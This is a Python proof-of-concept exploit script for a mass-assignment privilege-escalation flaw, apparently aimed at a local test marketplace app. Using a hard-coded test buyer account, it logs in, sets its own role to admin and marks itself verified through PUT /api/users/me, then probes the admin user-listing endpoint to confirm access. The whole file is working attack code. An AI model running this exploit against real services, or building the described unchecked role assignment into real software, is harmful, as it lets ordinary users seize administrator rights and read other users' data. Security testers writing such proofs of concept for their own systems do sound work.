#!/usr/bin/env python3
"""
BAC-1 — Mass Assignment → Role Escalation
Endpoint: PUT /api/users/me
Auth    : Any authenticated user

UpdateProfileRequest now accepts `role` and `is_verified` fields.
The endpoint applies them directly to the user model, allowing any
user to escalate their role to seller or admin, or self-verify.

Usage
-----
    python poc_005_mass_assignment_role_escalation.py
    python poc_005_mass_assignment_role_escalation.py --url http://localhost:8000 --role admin
"""

import argparse
import sys
import requests

USER_EMAIL    = "charlie@mercury.com"
USER_PASSWORD = "Buyer123!"


def banner():
    print("=" * 60)
    print("  BAC-1 — Mass Assignment → Role Escalation")
    print("  Endpoint: PUT /api/users/me")
    print("=" * 60)


def login(base_url, email, password):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login failed"); sys.exit(1)
    return token


def get_profile(base_url, token):
    resp = requests.get(f"{base_url}/api/users/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
    resp.raise_for_status()
    return resp.json()


def escalate(base_url, token, role):
    resp = requests.put(
        f"{base_url}/api/users/me",
        headers={"Authorization": f"Bearer {token}"},
        json={"role": role, "is_verified": True},
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def probe_admin(base_url, token):
    resp = requests.get(f"{base_url}/api/admin/users",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
    return resp.status_code, resp.json()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--role", default="admin", choices=["seller", "admin"])
    args = parser.parse_args()

    banner()
    token = login(args.url, USER_EMAIL, USER_PASSWORD)
    print(f"[+] Authenticated as {USER_EMAIL}")

    before = get_profile(args.url, token)
    print(f"[*] Role before: {before['role']}  |  verified: {before['is_verified']}")

    updated = escalate(args.url, token, args.role)
    print(f"[+] Role after : {updated['role']}  |  verified: {updated['is_verified']}")

    if args.role == "admin":
        code, data = probe_admin(args.url, token)
        if code == 200:
            print(f"[+] Admin endpoint accessible! Got {len(data)} users.")
        else:
            print(f"[-] Admin probe returned {code} — may need re-login for new token.")

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
